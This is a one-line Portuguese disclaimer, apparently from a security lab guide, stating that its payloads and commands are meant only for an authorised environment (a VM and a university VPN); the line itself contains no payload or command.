> Os payloads e comandos são para uso em ambiente autorizado (VM + VPN da UA).
